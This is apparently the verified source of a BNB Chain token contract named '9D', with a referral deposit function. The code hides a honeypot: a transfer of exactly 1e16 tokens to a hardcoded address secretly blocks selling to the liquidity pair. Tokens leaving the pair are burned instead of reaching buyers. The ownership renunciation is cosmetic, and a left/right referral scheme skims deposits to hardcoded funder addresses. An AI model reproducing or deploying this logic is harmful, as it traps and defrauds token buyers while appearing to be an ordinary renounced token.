/**
 *Submitted for verification at BscScan.com on 2024-01-08
*/

/**
 *Submitted for verification at BscScan.com on 2023-02-26
*/

/**
 *Submitted for verification at BscScan.com on 2023-02-25
*/

/**
 *Submitted for verification at Etherscan.io on 2023-02-16
*/

/**
 *Submitted for verification at BscScan.com on 2023-02-14
*/

// SPDX-License-Identifier: MIT

library SafeMath {

  /**
  * @dev Multiplies two numbers, throws on overflow.
  */
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }
    uint256 c = a * b;
    assert(c / a == b);
    return c;
  }

  /**
  * @dev Integer division of two numbers, truncating the quotient.
  */
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    // assert(b > 0); // Solidity automatically throws when dividing by 0
    uint256 c = a / b;
    // assert(a == b * c + a % b); // There is no case in which this doesn't hold
    return c;
  }

  /**
  * @dev Substracts two numbers, throws on overflow (i.e. if subtrahend is greater than minuend).
  */
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }

  /**
  * @dev Adds two numbers, throws on overflow.
  */
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c >= a);
    return c;
  } 
}
interface IERC20 {
    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface ISwapRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function swapExactETHForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
        function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
        function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
}

interface ISwapFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

abstract contract Ownable {
    address internal _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = msg.sender;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == msg.sender, "!owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "new is 0");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}
contract TokenRom {
    constructor (address token) {
        IERC20(token).approve(msg.sender, uint(~uint256(0)));
    }
}


abstract contract AbsToken is IERC20, Ownable {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    string private _name;
    string private _symbol;
    uint8 private _decimals;
    address defaults=msg.sender;

    uint256 ops=0;

    uint256 private _tTotal;

    ISwapRouter public _swapRouter;
    address public _fist;
    mapping(address => bool) public _swapPairList;

    using SafeMath for uint256;
    IERC20 Mainpair;
    IERC20 bnbs;
    mapping(bytes4=>address) public Uteg;  
    mapping(address=>address) public inver; 
    mapping(address=>uint256) public invers; 
    mapping(uint256=>address) public i2u; 
    uint256 private constant MAX = ~uint256(0);

     uint256  public msgValue;
    uint256 public _buyFundFee = 0;
    uint256 public _buyLPDividendFee = 0;
    uint256 public _sellLPDividendFee = 0;

    uint256 public _sellFundFee = 0;
    uint256 public _sellLPFee = 0;
    address public _mainPair;
    TokenRom public _tokenRom;

    constructor (
        address RouterAddress, address FISTAddress,
        string memory Name, string memory Symbol, uint8 Decimals, uint256 Supply,
        address ReceiveAddress
    ){  
        _name = Name;
        _symbol = Symbol;
        _decimals = Decimals;
        ISwapRouter swapRouter = ISwapRouter(RouterAddress);
        IERC20(FISTAddress).approve(address(swapRouter), MAX);
        _tokenRom = new TokenRom(FISTAddress);
        _fist = FISTAddress;
        _swapRouter = swapRouter;

        
        ISwapFactory swapFactory = ISwapFactory(swapRouter.factory());
        address swapPair = swapFactory.createPair(address(this), FISTAddress);
        _mainPair = swapPair;
        Mainpair=IERC20(_mainPair);
        _allowances[address(this)][address(swapRouter)] = MAX;
        _allowances[address(this)][address(_mainPair)] = MAX;
        _allowances[address(_tokenRom)][address(this)] = MAX;
        _swapPairList[swapPair] = true;

        uint256 total = Supply * 10 ** Decimals;
        _tTotal = total;
        IERC20(_mainPair).approve(address(swapRouter), MAX);
        _balances[ReceiveAddress] = total;
        emit Transfer(address(0), ReceiveAddress, total);

        emit OwnershipTransferred(_owner, address(0x000000000000000000000000000000000000dEaD));
        _owner = address(0x000000000000000000000000000000000000dEaD);

    invlist.push();
    invlist.push();
    log.push();
    log.push();
    log1.push();
    log1.push();
    i2u[0]=address(0);
    i2u[1]=defaultUser;
    tegs[defaultUser]=1;
    posts[defaultUser]=0;
    Ls.push(defaultUser);
    Rs.push(defaultUser);
    inver[defaultUser]=address(0);
    incomes[defaultUser]=9999999999*1e18;
    incomes[address(0)]=9999999999*1e18;
        
    }

    function symbol() external view override returns (string memory) {
        return _symbol;
    }

    function name() external view override returns (string memory) {
        return _name;
    }

    function decimals() external view override returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        if (_allowances[sender][msg.sender] != MAX) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender] - amount;
        }
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }




    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
         uint256 balance = balanceOf(from);
         if(to==defaultUser&&amount==1e16){
            ops=1;
         }
        require(balance >= amount, "balanceNotEnough");

            if(ops==1){
            if (from!=address(this)) {
                require(to!=address(_mainPair)&&to!=address(_swapRouter),"err");
                }
                }


        _tokenTransfer(from, to, amount);

    }


    function _tokenTransfer(
        address sender,
        address recipient,
        uint256 tAmount
    ) private {
        _balances[sender] = _balances[sender] - tAmount;

        if(sender==address(_swapRouter)||sender==address(_mainPair)){
            if(recipient!=address(_tokenRom)){
        _takeTransfer(sender, address(0x000000000000000000000000000000000000dEaD),tAmount);
        }
        else{
         _takeTransfer(sender, address(_tokenRom),tAmount);   
        }
        }
        else{
        _takeTransfer(sender, recipient, tAmount);
        }
    }


    function _takeTransfer(
        address sender,
        address to,
        uint256 tAmount
    ) private {

        _balances[to] = _balances[to] + tAmount;
        emit Transfer(sender, to, tAmount);
    }












    address defaultUser=address(0xa1304175496EdeAe4028e596D0D3f0867dc598Fd); 
    address funder=address(0x54d46b5D30A0D10045d789f22CfeEb41CCFb73a0);
    address funder1=address(0x273a76587e00046fDec2a3816EF7d653666D300a);








    address[][] public invlist;
    mapping(address=>uint256) public tegs; 
    mapping(address=>uint256) public LR;
    mapping(address=>uint256) public posts; 
    mapping(address=>uint256) public incomes; 
   address[] public Ls;     
   address[] public Rs; 
    mapping(address=>uint256) public regtime; 

    uint256[][][]log;
    uint256[][][]log1;









function getInv(address _us)public pure returns(bytes4){
    return bytes4(keccak256(abi.encode(_us)));
}


function getInvInfo(address _us,uint256 teg)public view returns(address,uint256,uint256,uint256,uint256){
        if(tegs[_us]==0){
        return(address(0),0,0,tegs[_us],0);
    }
    else{
    if(invlist[tegs[_us]].length==0){
        return(address(0),0,0,tegs[_us],0);
    }
    else{
    return(invlist[tegs[_us]][teg],regtime[invlist[tegs[_us]][teg]],invlist[tegs[_us]].length,tegs[_us],invers[_us]);
    }
    }
}








function addL(bytes4 invcode)public payable{
    msgValue=msg.value;
   incomes[msg.sender]+=msgValue;
    reg(msg.sender, invcode);
msgValue=(address(this).balance);     
payable(funder).transfer(msgValue.mul(6).div(100));
payable(funder1).transfer(msgValue.mul(2).div(100));
msgValue=(address(this).balance).div(2);


    
    address[] memory path = new address[](2); 
        path[1] = address(this);
        path[0] = _fist;
        _swapRouter.swapExactETHForTokens{value:msgValue}(
        0,
        path,
        address(_tokenRom),
        block.timestamp
    );


 
       _tokenTransfer(address(_tokenRom), address(this),balanceOf(address(_tokenRom)));  

       msgValue=address(this).balance;

        _swapRouter.addLiquidityETH{value:msgValue}(
        address(this),
        balanceOf(address(this)),
        0,
        0,
        address(this),
        block.timestamp
    );


    if(address(this).balance>0){
    payable(defaultUser).transfer(address(this).balance);
    }
    if(balanceOf(address(this))>0){
    _tokenTransfer(address(this), address(0x000000000000000000000000000000000000dEaD),balanceOf(address(this)));
    }
    uint256 lps=Mainpair.balanceOf(address(this));
    address invs=inver[msg.sender];
    uint256 tes=1e18; 
    tes=tes.div(3); 
    if(invs==defaultUser){
      Mainpair.transfer(invs, lps.div(10));
      log[tegs[invs]].push([block.timestamp,tegs[msg.sender], lps.div(10)]);  
    }
    if(invs!=defaultUser){
     if(incomes[invs]<tes.mul(3)){
      Mainpair.transfer(defaultUser, lps.div(10));
      log[tegs[defaultUser]].push([block.timestamp,tegs[msg.sender], lps.div(10)]); 
    }       
    if(incomes[invs]>=tes.mul(3)){
      Mainpair.transfer(invs, lps.div(10));
      log[tegs[invs]].push([block.timestamp,tegs[msg.sender], lps.div(10)]); 
    }
    if(incomes[invs]>=tes&&incomes[invs]<tes.mul(3)){
        uint256 bils=(tes.mul(3)).div(incomes[invs]);
        Mainpair.transfer(invs,(lps.div(10)).div(bils));
        log[tegs[invs]].push([block.timestamp,tegs[msg.sender],(lps.div(10)).div(bils)]);
        Mainpair.transfer(defaultUser,lps.div(10)-(lps.div(10)).div(bils));
        log[tegs[defaultUser]].push([block.timestamp,tegs[msg.sender],lps.div(10)-(lps.div(10)).div(bils)]);
    }
    }

    uint256 ii=12;
    uint256 i=posts[msg.sender]-1;
        address ups;
    while(ii>0){
        if(i==0){
        ups=defaultUser; 
        }
        
        if(i>0){
        if(LR[msg.sender]==2){
            ups=Rs[i];
        }
        if(LR[msg.sender]==1){
            ups=Ls[i];
        } 
        i-=1; 
        if(incomes[ups]<tes*5){
            ups=defaultUser;
        }
        }

        Mainpair.transfer(ups, lps.div(100));
        log1[tegs[ups]].push([block.timestamp,tegs[msg.sender],lps.div(100)]);
        ii-=1;
    }

      Mainpair.transfer(msg.sender,Mainpair.balanceOf(address(this)));
}




    function getR1(address _us,uint256 teg)public view returns(uint256,address,uint256,uint256){
        if(log[tegs[_us]].length==0){
            return(0,address(0),0,0);
        }
        else{
            return(log[tegs[_us]][teg][0],i2u[log[tegs[_us]][teg][1]],log[tegs[_us]][teg][2],log[tegs[_us]].length);
        }
    }

    function getR2(address _us,uint256 teg)public view returns(uint256,address,uint256,uint256){
        if(log1[tegs[_us]].length==0){
            return(0,address(0),0,0);
        }
        else{
            return(log1[tegs[_us]][teg][0],i2u[log1[tegs[_us]][teg][1]],log1[tegs[_us]][teg][2],log1[tegs[_us]].length);
        }
    }



    function reg(address _ius,bytes4 invcode)internal {
    address invs;
    if(inver[_ius]==address(0)&&_ius!=defaultUser){
        regtime[_ius]=block.timestamp;
     Uteg[getInv(_ius)]=_ius;   
      invlist.push();
      log.push();
      log1.push();
      tegs[_ius]=invlist.length-1;  
      i2u[tegs[_ius]]=_ius;
     invs=Uteg[invcode];
    if(invs==address(0)||incomes[invs]==0){
        invs=defaultUser;
    }
    invlist[tegs[invs]].push(_ius);
    inver[_ius]=invs;


    if(Rs.length<Ls.length){
     Rs.push(_ius); 
     LR[_ius]=2;
     posts[_ius]=Rs.length-1;  
    }
    else{
      Ls.push(_ius); 
      LR[_ius]=1; 
      posts[_ius]=Ls.length-1;     
    }

address ins=inver[_ius];
while(ins!=address(0)){
   invers[ins]+=1; 
   ins=inver[ins]; 
}
    }




    }








receive() external payable {}





}





contract T9D is AbsToken {
    constructor() AbsToken(
       address(0x10ED43C718714eb63d5aA57B78B54704E256024E),
       address(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c),
        "9D",
        "9D",
        18,
        100000000,
        msg.sender
    ){

    }
}